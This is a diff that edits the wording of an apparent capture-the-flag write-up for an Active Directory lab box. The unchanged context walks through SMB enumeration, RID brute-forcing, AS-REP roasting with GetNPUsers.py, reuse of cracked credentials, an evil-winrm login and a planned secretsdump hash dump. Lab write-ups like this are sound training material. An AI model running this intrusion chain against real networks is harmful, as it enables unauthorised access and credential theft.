@@ -69,7 +69,7 @@ we can enumerate shares anonymously providing a null password using smbmap
         VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
 ```
 
-There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous)
+There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous).
 The IPC$ share hints us of the possibility to do anonymous user enumeration. We will come to that later. Let's access the last two shares and see what contents they have
 
 ```python
@@ -97,23 +97,23 @@ smb: \> ls
   Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
 ```
 ##
-Let's download all the contents onto our local machine
+Download all the contents onto our local machine
 ```
 smb: \> mget *
 ```
 ##
-We get potential usernames and other info from the downloaded files from smb. so let's build our username list. Spoiler alert!!, the usernames in the files were generic and didn't match with those create on the machine
+We get potential usernames and other info from the downloaded files from smb. so let's build our username list. Spoiler alert!!, the usernames in the files were generic and didn't match with those created on the machine
 
 Time to find a way to enumerate usernames on the box. i will be using rid-brute from crackmapexec
 ```python
 crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser
 ```
-Since this is anonymous login, you can replace username robot with whatever you like. I used robot because i amm one -:)
+Since anonymous login allowed, you can replace username robot with whatever name you like. I used robot because i am ROBOT -:)
 
 ![image](https://user-images.githubusercontent.com/68066436/118685539-3038aa80-b7d1-11eb-91e9-572fcd48794a.png)
 
 ##
-Extract the usernames with rid greater than 1000 into a username file. I named mine users.txt with below content
+Extract the usernames with RID greater than 1000 into a username file. I named my file users.txt with below usernames
 
 ```
 enterprise-core-vn
@@ -123,7 +123,7 @@ j-goldenhand
 j-leet
 ```
 ##
-kerberoasting with the username file returns a hash for t-skid
+Try kerberoasting with the username file returns a hash for t-skid (Implies user t-skid does not require kerberos pre-authentication)
 
 ```python
 python3 GetNPUsers.py -dc-ip 10.10.176.144 -usersfile users.txt vulnnet-rst.local/
@@ -142,19 +142,20 @@ user: t-skid
 pass: <redacted>
 ```
 
-Try to access smb again with new creds to see if we get more access to some shares
+Try to access smb again with the new creds to see if we can elevate our access to some shares
 ```python
 smbmap -H vulnet.thm -u t-skid -p '<redacted>'
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118689875-77c13580-b7d5-11eb-88a7-c99bc26d771f.png)
-Notice t-skid has read access to NETLOGON and SYSVOL shares which we did have with the anonymous logins
+Notice t-skid now has read access to NETLOGON and SYSVOL shares which we did not have with the anonymous logins
 
-Let's access NETLOGON share with smbclient and see what we've got in there
+Let's access NETLOGON share with smbclient and see what we've got in there using t-skid's creds
 ```python
 smbclient //vulnet.thm/NETLOGON -U t-skid
 ```
 ![image](https://user-images.githubusercontent.com/68066436/118690902-82c89580-b7d6-11eb-95f2-9fb1715a6c6b.png)
 
+##
 We get a new username and password after downloading and reading the content of ResetPassword.vbs
 ![image](https://user-images.githubusercontent.com/68066436/118691117-bf948c80-b7d6-11eb-9360-202d1f66c064.png)
 
@@ -173,7 +174,7 @@ evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
 
 ## Privilege Escalation
 
-Checked groups and realised user a-whitehat belongs to domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket
+Checked groups and realised user a-whitehat belong to the domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket
 
 ![image](https://user-images.githubusercontent.com/68066436/118693532-21ee8c80-b7d9-11eb-9b2d-195be8421d32.png)
 
